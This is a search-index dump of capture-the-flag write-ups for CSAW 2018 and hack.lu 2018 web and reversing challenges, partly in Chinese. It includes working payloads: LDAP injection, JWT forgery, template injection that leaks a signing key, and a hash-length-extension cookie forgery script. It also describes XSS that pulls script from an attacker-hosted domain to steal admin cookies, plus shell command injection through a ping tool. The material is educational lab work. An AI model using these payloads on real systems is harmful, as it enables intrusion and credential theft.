zero-knowledge. It uses the raw image that players can extract. Solve script with zero knowledge: python3 zksolve.py PROD_SERVER_IP .","title":"Components"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#dev-client","text":"Dockerfile-dev_client Even though this is named client, it's actually a server too (sorry). Changes no resources and has no state between connections, so multiple instances can be spun up and load balanced if needed.","title":"Dev client"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#dev-server","text":"Dockerfile-dev_server State is backed by a sqlite3 db. Multiple separate instances wouldn't change the challenge too much, but it would be confusing.","title":"Dev server"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#prod-server","text":"Dockerfile-prod_server If you want to edit the flag, change it in this Dockerfile. State is backed by a sqlite3 db. Multiple separate instances wouldn't change the challenge too much.","title":"Prod server"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#dev-client-server-flow","text":"Players MITM and watch the dev client communicate with the server Client connects to server and initializes SSL Client logs in (from small list of creds) Client sets random pixels from image Client disconnects","title":"Dev client-server flow"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#solution","text":"Player logs in (using admin:admin) Player sends a special GetFlag message that the client never sends. Prod server checks that the client logged in and sends a location back Player resends flag request with the pixel data in image at that location Server validates the pixel and sends back the flag","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/web/ldab/","text":"LDAP Challenge \u00b6 This is an LDAP Injection challenge competitors need to develop a query to inject to be able to leak information. Description: Someone in this company directory doesn't belong can you find them? Solution: *))(|(objectClass=* Flag: flag{ld4p_inj3ction_i5_a_th1ng}","title":"ldab"},{"location":"CSAW-CTF-2018-Quals/web/ldab/#ldap-challenge","text":"This is an LDAP Injection challenge competitors need to develop a query to inject to be able to leak information. Description: Someone in this company directory doesn't belong can you find them? Solution: *))(|(objectClass=* Flag: flag{ld4p_inj3ction_i5_a_th1ng}","title":"LDAP Challenge"},{"location":"CSAW-CTF-2018-Quals/web/movie_club/","text":"Hacker Movie Club \u00b6 Points: 200 Flag: flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es} Description Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch. Setup \u00b6 Edit server/test.py , change the domain line 28 to the domain being used for the chal (so if the record is *.thing.stuff.foo , change it to thing.stuff.foo ). ./build.sh will build the docker image (might take a bit) ./run.sh runs it (needs CAP_ADMIN because of chrome and puppeteer) Edit the gunicorn line of ./setup.sh if you want more gunicorn workers","title":"Hacker Movie Club"},{"location":"CSAW-CTF-2018-Quals/web/movie_club/#hacker-movie-club","text":"Points: 200 Flag: flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es} Description Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch.","title":"Hacker Movie Club"},{"location":"CSAW-CTF-2018-Quals/web/movie_club/#setup","text":"Edit server/test.py , change the domain line 28 to the domain being used for the chal (so if the record is *.thing.stuff.foo , change it to thing.stuff.foo ). ./build.sh will build the docker image (might take a bit) ./run.sh runs it (needs CAP_ADMIN because of chrome and puppeteer) Edit the gunicorn line of ./setup.sh if you want more gunicorn workers","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/web/movie_club/writeup/","text":"import time import requests \"\"\" Change the host below to what ever cdn you get for your ip. Once this script finishes, have the admin visit Put this file in /cdn/main.mst on your server, etc <div> <div id=\"captcha\"></div> </div> <button id=\"report\"></button> {{#movies}} <img src=\"http://stackchk.fail/{{name}}\"/> {{/movies}} \"\"\" while True : r = requests . get ( 'http://1f8f5aca36d8114acf5de3651b2e1af5a507e264.cache2.stackchk.fail/cdn/app.js' , headers = { 'X-Forwarded-Host' : 'stackchk.fail' }) # replace with your own domain for resp in r . history : print resp . status_code , resp . url if '//stackchk.fail' in r . text : print r . text break print r . headers age = int ( r . headers [ 'Age' ]) if age > 120 : time . sleep ( 120 ) else : time . sleep ( 120.1 - age )","title":"movie_club"},{"location":"CSAW-CTF-2018-Quals/web/nvs/","text":"No Vulnerable Services \u00b6 Solution Stage 1: \u00b6 dynamic subdomain generation in records from served-by header, footer p, etc. (X-Served-By: d8a50228.ip.no.vulnerable.services resolves to 216.165.2.40) CSP to only allow JS from http://*.no.vulnerable.services (and recaptcha stuff) contact us for pricing page -> XSS leak admin cookies by script src'ing something hosted on a VM (accessible at {ip_hex_encoded}.rev.no.vulnerable.services) STAGE 2: \u00b6 loadbalancer running at 216.165.2.41 find that loadbalancer won't proxy support page (403) but will proxy arb IPs find that the LB gratuitously follows redirects but doesn't whitelist check against the redirect IP setup http server that responds with a 302 to support.no.vulnerable.services exploit support page's ping tool (command execute) 127.0.0.`ls`","title":"nvs"},{"location":"CSAW-CTF-2018-Quals/web/nvs/#no-vulnerable-services","text":"Solution","title":"No Vulnerable Services"},{"location":"CSAW-CTF-2018-Quals/web/nvs/#stage-1","text":"dynamic subdomain generation in records from served-by header, footer p, etc. (X-Served-By: d8a50228.ip.no.vulnerable.services resolves to 216.165.2.40) CSP to only allow JS from http://*.no.vulnerable.services (and recaptcha stuff) contact us for pricing page -> XSS leak admin cookies by script src'ing something hosted on a VM (accessible at {ip_hex_encoded}.rev.no.vulnerable.services)","title":"Stage 1:"},{"location":"CSAW-CTF-2018-Quals/web/nvs/#stage-2","text":"loadbalancer running at 216.165.2.41 find that loadbalancer won't proxy support page (403) but will proxy arb IPs find that the LB gratuitously follows redirects but doesn't whitelist check against the redirect IP setup http server that responds with a 302 to support.no.vulnerable.services exploit support page's ping tool (command execute) 127.0.0.`ls`","title":"STAGE 2:"},{"location":"CSAW-CTF-2018-Quals/web/sso/writeup/","text":"SSO \u00b6 \u8ddf\u7740\u8d70oauth\u6d41\u7a0b 0x01 \u00b6 request POST /oauth2/authorize Content-Type: application/x-www-form-urlencoded response_type=code response Redirecting to <a href=\"undefined?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vZXhhbXBsZS5jb20vIiwiaWF0IjoxNTM3MDE2NTE4LCJleHAiOjE1MzcwMTcxMTh9.FjAJ1NZQLfXxRW-2_VfSEXgNxMZrRcX8d7DES5_X3jI&amp;state=\">undefined?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vZXhhbXBsZS5jb20vIiwiaWF0IjoxNTM3MDE2NTE4LCJleHAiOjE1MzcwMTcxMTh9.FjAJ1NZQLfXxRW-2_VfSEXgNxMZrRcX8d7DES5_X3jI&state=</a> 0x02 \u00b6 request POST /oauth2/token Content-Type: application/x-www-form-urlencoded grant_type=authorization_code&code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vZXhhbXBsZS5jb20vIiwiaWF0IjoxNTM3MDE2NTE4LCJleHAiOjE1MzcwMTcxMTh9.FjAJ1NZQLfXxRW-2_VfSEXgNxMZrRcX8d7DES5_X3jI&state=&redirect_uri=http://example.com/ response {\"token_type\":\"Bearer\",\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzAxNjYxOCwiZXhwIjoxNTM3MDE3MjE4fQ.iQ3yQU7ocIPMPaZEGiCL_fqzxW-tqV4ywt0LvPiSJrU\"} 0x03 \u00b6 \u8fd9\u91cc\u7684 jwt \u89e3\u7801\u540e\u53d1\u73b0\u662f \u5c06 type \u6539\u4e3aadmin\u5f97\u5230\u65b0\u7684jwt request GET /protected HTTP/1.1 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcwMTY2MTgsImV4cCI6MTUzNzAxNzIxOH0.Q85qkVmTu6xxeabjyT3dbXSBqJ1bSAfw9pNd5s4L4-A \u8fd4\u56deflag","title":"sso"},{"location":"CSAW-CTF-2018-Quals/web/sso/writeup/#sso","text":"\u8ddf\u7740\u8d70oauth\u6d41\u7a0b","title":"SSO"},{"location":"CSAW-CTF-2018-Quals/web/sso/writeup/#0x01","text":"request POST /oauth2/authorize Content-Type: application/x-www-form-urlencoded response_type=code response Redirecting to <a href=\"undefined?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vZXhhbXBsZS5jb20vIiwiaWF0IjoxNTM3MDE2NTE4LCJleHAiOjE1MzcwMTcxMTh9.FjAJ1NZQLfXxRW-2_VfSEXgNxMZrRcX8d7DES5_X3jI&amp;state=\">undefined?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vZXhhbXBsZS5jb20vIiwiaWF0IjoxNTM3MDE2NTE4LCJleHAiOjE1MzcwMTcxMTh9.FjAJ1NZQLfXxRW-2_VfSEXgNxMZrRcX8d7DES5_X3jI&state=</a>","title":"0x01"},{"location":"CSAW-CTF-2018-Quals/web/sso/writeup/#0x02","text":"request POST /oauth2/token Content-Type: application/x-www-form-urlencoded grant_type=authorization_code&code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vZXhhbXBsZS5jb20vIiwiaWF0IjoxNTM3MDE2NTE4LCJleHAiOjE1MzcwMTcxMTh9.FjAJ1NZQLfXxRW-2_VfSEXgNxMZrRcX8d7DES5_X3jI&state=&redirect_uri=http://example.com/ response {\"token_type\":\"Bearer\",\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzAxNjYxOCwiZXhwIjoxNTM3MDE3MjE4fQ.iQ3yQU7ocIPMPaZEGiCL_fqzxW-tqV4ywt0LvPiSJrU\"}","title":"0x02"},{"location":"CSAW-CTF-2018-Quals/web/sso/writeup/#0x03","text":"\u8fd9\u91cc\u7684 jwt \u89e3\u7801\u540e\u53d1\u73b0\u662f \u5c06 type \u6539\u4e3aadmin\u5f97\u5230\u65b0\u7684jwt request GET /protected HTTP/1.1 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcwMTY2MTgsImV4cCI6MTUzNzAxNzIxOH0.Q85qkVmTu6xxeabjyT3dbXSBqJ1bSAfw9pNd5s4L4-A \u8fd4\u56deflag","title":"0x03"},{"location":"CSAW-CTF-2018-Quals/web/wtf_sql/","text":"WTF.SQL \u00b6 Description: (see crawl.txt) Points: 500 Category: Web Flag: flag{b3tter_th@n_th3_prequels} Solve: 1. robots.txt -> find all routes 1. use verifier route to leak source for all routes, subroutines 1. Template injection * can't use ${config_signing_key} in post directly since it's blacklisted * recursive template expansion allows use of ${GET_asdf} * if ?asdf=${config_signing_key} then it will get interpolated again leaking secret 1. secret is used to sign cookies 1. allows you to change is_admin 1. get to admin panel, need to add privileges 1. HLE to add panel_view and panel_create privs, giving you arbitrary db.table read 1. ggwp Formatting notes: * Types * Routes should be VARCHAR(255) * header, cookie, template, etc. keys should be VARCHAR(255) * header, cookie, template, etc. values should be TEXT * response is TEXT * Naming * k/v pairs are always name value (to add to the confusion)","title":"WTF.SQL"},{"location":"CSAW-CTF-2018-Quals/web/wtf_sql/#wtfsql","text":"Description: (see crawl.txt) Points: 500 Category: Web Flag: flag{b3tter_th@n_th3_prequels} Solve: 1. robots.txt -> find all routes 1. use verifier route to leak source for all routes, subroutines 1. Template injection * can't use ${config_signing_key} in post directly since it's blacklisted * recursive template expansion allows use of ${GET_asdf} * if ?asdf=${config_signing_key} then it will get interpolated again leaking secret 1. secret is used to sign cookies 1. allows you to change is_admin 1. get to admin panel, need to add privileges 1. HLE to add panel_view and panel_create privs, giving you arbitrary db.table read 1. ggwp Formatting notes: * Types * Routes should be VARCHAR(255) * header, cookie, template, etc. keys should be VARCHAR(255) * header, cookie, template, etc. values should be TEXT * response is TEXT * Naming * k/v pairs are always name value (to add to the confusion)","title":"WTF.SQL"},{"location":"CSAW-CTF-2018-Quals/web/wtf_sql/writeup/","text":"\u6253\u5f00\u8fde\u63a5\u540e\u53ef\u4ee5\u770b\u5230\u662f\u4e00\u4e2a\u6ce8\u518c\u9875\u9762\uff0c\u800c\u4e14\u6ce8\u518c\u540e\u6ca1\u6709\u767b\u5f55\u64cd\u4f5c\uff0c\u76f4\u63a5\u5c31\u4f1a\u53d8\u6210\u5df2\u767b\u5f55\u72b6\u6001\u4e14\u8df3\u8f6c\u5230\u4e2a\u4eba\u9875\u9762 \u626b\u5230robots.txt\u6587\u4ef6\uff0c\u5185\u5bb9\u4fe1\u606f\u91cf\u5f88\u5927 User-agent: * Disallow: / # procedure:index_handler Disallow: /admin # procedure:admin_handler Disallow: /login # procedure:login_handler Disallow: /post # procedure:post_handler Disallow: /register # procedure:register_handler Disallow: /robots.txt # procedure:robots_txt_handler Disallow: /static/% # procedure:static_handler Disallow: /verify # procedure:verify_handler # Yeah, we know this is contrived :( \u4f7f\u7528 verify \u8def\u7531\u53ef\u4ee5\u9605\u8bfb\u5230\u4e00\u4e9b\u7a0b\u5e8f\u7684\u6e90\u7801 \uff08\u5168\u90fd\u662f\u5b58\u50a8\u8fc7\u7a0b\uff09 \u770b\u5230\u8fd9\u4e2a\u8def\u7531\u540e\uff0c\u9996\u5148\u60f3\u5230\u7684\u662f\u8bbf\u95ee admin \u8def\u7531\uff0c\u4f46\u662f\u53ef\u4ee5\u770b\u5230 admin_handler \u4e2d\u5b58\u5728\u5224\u65ad\uff1a CALL is_admin(admin) \u7136\u540e\u770b\u5230 login_handler \uff0c login \u5b58\u50a8\u8fc7\u7a0b\uff0c\u53ef\u4ee5\u627e\u5230\u8bbe\u7f6ecookie \u7684 set_cookie BEGIN DECLARE signed_value TEXT ; CALL sign_cookie ( i_value , signed_value ); INSERT INTO ` resp_cookies ` VALUES ( i_name , signed_value ) ON DUPLICATE KEY UPDATE ` value ` = signed_value ; END \u4ee5\u53ca\u5176\u4e2d\u7684 sign_cookie BEGIN DECLARE secret, signature TEXT; SET secret = (SELECT `value` FROM `config` WHERE `name` = 'signing_key'); SET signature = SHA2(CONCAT(cookie_value, secret), 256); SET signed = CONCAT(signature, LOWER(HEX(cookie_value))); END \u53ef\u4ee5\u53d1\u73b0\u5728 config \u8868\u4e2d\u5b58\u4e86\u4e00\u4e2a\u53eb\u505a signing_key \u7684 secret_key \u90a3\u4e48\u5982\u4f55\u53d6\u5230\u8fd9\u4e2a signing_key ? \u9605\u8bfb\u4e86\u5f88\u591a\u4e2a\u5b58\u50a8\u8fc7\u7a0b\u540e\uff0c\u5728\u6e32\u67d3\u6a21\u677f\u4e2d\u5176\u5b9e\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u7a81\u7834\u70b9\uff0c\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2aSSTI\u6f0f\u6d1e \u9996\u5148\uff0c\u67e5\u770b login_handler \u7684\u65f6\u5019\uff0c\u53d1\u73b0\u5176\u4e2d call \u4e86\u4e00\u4e2a template \uff0c\u5728 template \u4e2d\u53ef\u4ee5\u770b\u5230\u53c8 call \u4e86\u4e00\u4e2a template_string \u6765\u8fdb\u884c\u6e32\u67d3\uff0c\u770b\u770b\u8fd9\u4e2a\u4ee3\u7801 BEGIN DECLARE formatted TEXT ; DECLARE fmt_name , fmt_val TEXT ; DECLARE replace_start , replace_end , i INT ; SET @ template_regex = '\\$\\{[a-zA-Z0-9_ ]+\\}' ; CREATE TEMPORARY TABLE IF NOT EXISTS ` template_vars ` ( ` name ` VARCHAR ( 255 ) PRIMARY KEY , ` value ` TEXT ); CALL populate_common_template_vars (); SET formatted = template_s ; SET i = 0 ; WHILE ( formatted REGEXP @ template_regex AND i < 50 ) DO SET replace_start = REGEXP_INSTR ( formatted , @ template_regex , 1 , 1 , 0 ); SET replace_end = REGEXP_INSTR ( formatted , @ template_regex , 1 , 1 , 1 ); SET fmt_name = SUBSTR ( formatted FROM replace_start + 2 FOR ( replace_end - replace_start - 2 - 1 )); SET fmt_val = ( SELECT ` value ` FROM ` template_vars ` WHERE ` name ` = TRIM ( fmt_name )); SET fmt_val = COALESCE ( fmt_val , '' ); SET formatted = CONCAT ( SUBSTR ( formatted FROM 1 FOR replace_start - 1 ), fmt_val , SUBSTR ( formatted FROM replace_end )); SET i = i + 1 ; END WHILE ; SET resp = formatted ; DROP TEMPORARY TABLE ` template_vars ` ; END \u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u5b57\u7b26\u4e32\u6ee1\u8db3 template_regex \u90a3\u4e48\u5b83\u5c06\u4f1a\u88ab\u66ff\u6362\u6210\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\uff0c\u800c\u8fd9\u4e9b\u53d8\u91cf\u5219\u6765\u81ea\u4e8e populate_common_template_vars BEGIN INSERT INTO ` template_vars ` SELECT CONCAT ( 'config_' , name ), value FROM ` config ` ; INSERT INTO ` template_vars ` SELECT CONCAT ( 'request_' , name ), value FROM ` query_params ` ; END \u6240\u4ee5\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 ${config_signing_key} \u6765\u83b7\u53d6sign key\uff0c\u4f46\u662f\u88ab\u62e6\u4f4f\u4e86\uff0c\u63d0\u793a Banned word used in post! \u90a3\u4e48\u8fd9\u91cc\u8003\u8651\u4f7f\u7528\u5176\u5b83\u503c\u6765\u83b7\u53d6\uff0c\u8003\u8651\u5230\u6ce8\u518c\u540e\u76f4\u63a5\u663e\u793a\u4e2a\u4eba\u4e3b\u9875\uff0c\u90a3\u4e48\u5c1d\u8bd5\u6ce8\u518c\u7684\u65f6\u5019\u5c06\u7528\u6237\u540d\u8bbe\u7f6e\u6210 ${config_signing_key} \uff0c\u6ce8\u518c\u6210\u529f\u540e\u8df3\u5230\u4e2a\u4eba\u4e3b\u9875\u6210\u529f\u83b7\u53d6\u5230\u4e86secret key \u7136\u540e\u7b97\u51fa\u7ba1\u7406\u5458\u7684cookie #coding=utf-8 import hashlib signing_key = \"an_bad_secret_value_nhcq497y8\" . encode ( \"utf-8\" ) m = hashlib . sha256 () m . update ( \"1\" . encode ( \"utf-8\" )) m . update ( signing_key ) print ( m . hexdigest () + '1' . encode ( 'hex' )) \u5f97\u5230 admin = 3efb7d99e34432bb6405b6a95619978d4904a2f5b5d8d56b3702939c226d729431 \u4fee\u6539cookie\u540e\u8bbf\u95ee\u53d1\u73b0\u9875\u9762\u4e0a\u4ec0\u4e48\u4e1c\u897f\u90fd\u6ca1\u6709\uff0c\u770b\u5230 admin_handler \u4e2d\u5b58\u5728\u7684\u5224\u65ad CALL has_priv ( 'panel_create' , can_create_panels ); CALL has_priv ( 'panel_view' , can_view_panels ); \u67e5\u770b has_priv BEGIN DECLARE privs , cur_privs , cmp_priv BLOB ; DECLARE hash , signing_key TEXT ; SET o_has_priv = FALSE ; SET privs = NULL ; CALL get_cookie ( 'privs' , privs ); IF NOT ISNULL ( privs ) THEN SET hash = SUBSTR ( privs FROM 1 FOR 32 ); SET cur_privs = SUBSTR ( privs FROM 33 ); SET signing_key = ( SELECT ` value ` FROM ` priv_config ` WHERE ` name ` = 'signing_key' ); IF hash = MD5 ( CONCAT ( signing_key , cur_privs )) THEN WHILE ( LENGTH ( cur_privs ) > 0 ) DO SET cmp_priv = SUBSTRING_INDEX ( cur_privs , ';' , 1 ); IF cmp_priv = i_priv THEN SET o_has_priv = TRUE ; END IF ; SET cur_privs = SUBSTR ( cur_privs FROM LENGTH ( cmp_priv ) + 2 ); END WHILE ; END IF ; END IF ; END \u53ef\u4ee5\u770b\u5230 priv \u7684\u503c\u5176\u5b9e\u5c31\u662f md5(priv_signing_key + privs) + privs \uff0c\u800c\u8fd9\u79cd\u52a0\u5bc6\u65b9\u5f0f\uff0c\u5b58\u5728\u54c8\u5e0c\u957f\u5ea6\u6269\u5c55\u653b\u51fb\u7684\u53ef\u80fd\uff0c\u4f7f\u7528hashpump\u6765\u8fdb\u884c\u653b\u51fb\uff0c\u5199\u4e2a\u811a\u672c\u7b97\u4e00\u4e0bpriv #coding=utf-8 import requests import hashpumpy import binascii import hashlib if __name__ == \"__main__\" : for i in range ( 1 , 33 ): res = hashpumpy . hashpump ( \"60f0cc64f5b633cf502d25ea561a98bf\" , \" \\x00 \" , \";panel_create;panel_view;\" , i ) # use res[1] as res[1][1:] to ignore the first byte! res0 = res [ 0 ] res1 = binascii . hexlify ( res [ 1 ][ 1 :]) . decode ( \"utf-8\" ) m = hashlib . sha256 () # sha256 ( m . update ( str . encode ( res [ 0 ])) # (md5(signing_key, privs) m . update ( res [ 1 ][ 1 :]) # + privs) m . update ( str . encode ( 'an_bad_secret_value_nhcq497y8' )) # + secret) priv = m . hexdigest () + binascii . hexlify ( str . encode ( res0 ) + res [ 1 ][ 1 :]) . decode ( \"utf-8\" ) # + (md5(signing_key, privs) + privs) cookies = { \"email\" : \"1d01019d1418a8eef8b22d46bcf40f4cef3475bfe37496f42c3cc3f391a5bfa934757575407176712e696d\" , \"admin\" : \"3efb7d99e34432bb6405b6a95619978d4904a2f5b5d8d56b3702939c226d729431\" , \"privs\" : priv } req = requests . get ( \"http://web.chal.csaw.io:3306/admin\" , cookies = cookies ) if len ( req . text ) != 287 : print ( priv ) break \u66ff\u6362\u540e\u53ef\u4ee5\u770b\u5230\u4e00\u4e2apanel\uff0c\u968f\u4fbf\u8f93\u5165\u4e00\u4e2a\u4e1c\u897f\u4f1a\u63d0\u793a no such table \uff0c\u4e8e\u662f\u5c1d\u8bd5\u8f93\u5165 config\uff0c\u8fd4\u56de\u4e86\u8868\u5185\u5bb9\uff0c\u7136\u540e\u63d0\u793a\u4e2d\u6709\u8bf4\u5230 Your mission is to read out the txt table in the flag database. \u4e8e\u662f\u8f93\u5165 flag.txt \uff0c\u5f97\u5230flag","title":"wtf_sql"},{"location":"hacklu2018/web/IdeaShare/writeup/","text":"IDeaShare \u00b6 \u9898\u76ee\u63cf\u8ff0 \u00b6 A place to share your IDeas with your friends! Try to win the best IDea competition but be wary a strong force prevents any cheating. Good luck you will need it! \u9898\u76ee\u5730\u5740(2018.10.31\u4ecd\u53ef\u6b63\u5e38\u8bbf\u95ee)\uff1a IDeaShare \u8bbf\u95ee\u9898\u76ee\u5730\u5740\u53d1\u73b0\u662f\u4e00\u4e2a\u5206\u4eab\u60f3\u6cd5\u7684\u5e73\u53f0\uff0c\u7528\u6237\u767b\u5f55\u540e\u53ef\u4ee5\u4fdd\u5b58\u81ea\u5df1\u7684\u60f3\u6cd5\uff0c\u5c06\u4fdd\u5b58\u7684\u60f3\u6cd5\u5206\u4eab\u4ee5\u540e\uff0c\u7ba1\u7406\u5458\u4f1a\u8fdb\u884c\u67e5\u770b\uff0c\u5982\u679c\u5206\u4eab\u7684\u60f3\u6cd5\u88ab\u7ba1\u7406\u5458\u8bc4\u4ef7\u4e3a Best Idea ,\u5c31\u4f1a\u8d62\u5f97 BEST IDEA COMPETITION \u89e3\u9898\u601d\u8def \u00b6 \u8bbf\u95ee\u9898\u76ee\u65f6\uff0c\u54cd\u5e94\u5934\u4e2d\u5b58\u5728\u8fd9\u6837\u7684\u5b57\u6bb5 X-XSS-Protection: 0 ,\u518d\u52a0\u4e0a\u77e5\u9053\u7ba1\u7406\u5458\u5c06\u4f1a\u8bbf\u95ee\u63d0\u4ea4\u7684\u60f3\u6cd5\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u60f3\u5230\u6784\u9020XSS\u3002\u4f46\u9996\u5148\u63d0\u4ea4\u7684\u60f3\u6cd5\u4e2d\u5bf9\u8bb8\u591a\u5173\u952e\u5b57\u8fdb\u884c\u4e86\u8fc7\u6ee4(\u8be1\u5f02\u7684\u8fc7\u6ee4\u89c4\u5219)\uff0c\u5176\u6b21\u76f4\u63a5\u8bbf\u95ee\u5206\u4eab\u7684\u60f3\u6cd5\uff0c\u4e5f\u5e76\u4e0d\u80fd\u770b\u5230\u89e3\u6790\u751f\u6548\u7684\u5185\u5bb9\uff0c\u6d4b\u8bd5\u4e2d\u53d1\u73b0\u7b2c\u4e8c\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7HTTP\u53c2\u6570\u6c61\u67d3\u6765\u8fdb\u884c\u7ed5\u8fc7\u3002 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u6784\u9020XSS \u00b6 \u9996\u5148\u6211\u4eec\u5728\u8bb0\u5f55\u60f3\u6cd5\u7684\u6587\u672c\u6846\u4e2d\u8f93\u5165\u60f3\u6cd5\uff0c\u8fd9\u91cc\u7684\u8fc7\u6ee4\u89c4\u5219\u975e\u5e38\u8be1\u5f02\uff0c\u4f46link\u6807\u7b7e\u6ca1\u6709\u88ab\u8fc7\u6ee4\uff0c\u8f93\u5165\u4e0b\u9762\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u6210\u529f\u4fdd\u5b58\uff0c\u6ca1\u6709\u88ab\u62e6\u622a\uff1a < link / rel = import href = https://https.zer0b.com/BlueLotus_XSSReceiver/myjs/tester.js > \u7136\u540e\u6211\u7684\u7528\u6237id\u662f304\uff0c\u6240\u4ee5\u8bbf\u95ee\u4e0b\u9762\u7684url\u5730\u5740\u53ef\u4ee5\u770b\u5230\u5206\u4eab\u7684\u5185\u5bb9\uff0c\u6d4b\u8bd5\u5230tester.js\u4e2d\u7684\u5185\u5bb9\u88ab\u6267\u884c\u4e86 https://arcade.fluxfingers.net:1818/?page=view&raw&owner=304&pad=1 \u4ee5\u4e0a\u662fXSS\u7684\u90e8\u5206\u7684\u5229\u7528\u8fc7\u7a0b\uff0c\u4f46\u5176\u5b9e\u8fd9\u4e2a\u5229\u7528\u8fc7\u7a0b\u662f\u6709\u4e00\u4e9b\u9650\u5236\u7684\uff1a link\u6807\u7b7e\u7684href\u5c5e\u6027\u5fc5\u987b\u5f15\u7528https\u7684\u8d44\u6e90\uff0c\u5f15\u7528http\u5730\u5740\u65f6\u4f1a\u6709\u4e0b\u9762\u8fd9\u6837\u7684\u63d0\u793a\u8bf4\u4e0d\u5b89\u5168\uff0c\u88ab\u963b\u6b62 \u6240\u4ee5\u5229\u7528\u65f6\u6700\u597d\u6709\u81ea\u5df1\u7684\u57df\u540d\uff0c\u5e76\u542f\u7528https,\u8fd9\u91cc\u6211\u4f7f\u7528\u4e86 let's encrypt \u8bbe\u7f6e\u8bc1\u4e66(\u514d\u8d39) \u56e0\u4e3alink\u6807\u7b7e\u5f15\u7528\u4e86\u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684js\u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u5b58\u653ejs\u7684\u670d\u52a1\u5668\u9700\u8981\u8bbe\u7f6e Access-Control-Allow-Origin \u5934\u624d\u53ef\u4ee5\u4f7f\u8d44\u6e90\u88ab\u6b63\u5e38\u5f15\u7528\uff0c\u5982\u679c\u672a\u8bbe\u7f6e\u7684\u8bdd\u62a5\u9519\u5982\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230\u8de8\u57df\u5f15\u7528\u8d44\u6e90\u88ab\u7981\u6b62\u4e86 \u5bf9nginx\u670d\u52a1\u5668\u6765\u8bf4\uff0cconfig\u6587\u4ef6\u4e2d\u589e\u52a0\u4ee5\u4e0b\u914d\u7f6e\u5c31\u53ef\u4ee5\u542f\u7528\u8de8\u57df\u8d44\u6e90\u5171\u4eab\u4e86 add_header Access-Control-Allow-Origin * ; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS' ; add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization' ; \u5229\u7528HTTP\u53c2\u6570\u6c61\u67d3 \u00b6 \u5206\u4eab\u4ee5\u540e\u7684\u60f3\u6cd5\u4f1a\u51fa\u73b0\u5728\u8fd9\u6837\u7684\u5217\u8868\u4e2d\uff0c\u7ba1\u7406\u5458\u4f1a\u8bbf\u95ee\u8fd9\u4e2a\u5217\u8868\u4e2d\u7684\u5730\u5740\u67e5\u770b\u5e76\u8bc4\u4f30\u6211\u4eec\u7684\u60f3\u6cd5\uff0c\u5217\u8868\u4e2d\u7684url\u5730\u5740\u5982\u4e0b\u6240\u793a\uff1a < a href = ?page=view&owner=304&pad=3 > IDea Number 3 </ a > \u5f88\u660e\u663e\uff0c\u548c\u524d\u9762\u6211\u4eec\u6784\u9020\u7684XSS\u5730\u5740\u683c\u5f0f\u76f8\u5bf9\u6bd4\uff0c\u8fd9\u91cc\u7f3a\u5c11\u4e86\u4e00\u4e2a raw \u53c2\u6570\uff0c\u6240\u4ee5\u7ba1\u7406\u5458\u8fdb\u884c\u8bbf\u95ee\u65f6\uff0c\u770b\u5230\u5e76\u4e0d\u662f\u6211\u4eec\u63d0\u4ea4\u7684raw\u683c\u5f0f\u7684\u5185\u5bb9\uff0c\u63d0\u4ea4\u7684\u5185\u5bb9\u6ca1\u6709\u88ab\u6d4f\u89c8\u5668\u89e3\u6790\uff0c\u65e0\u6cd5\u89e6\u53d1XSS 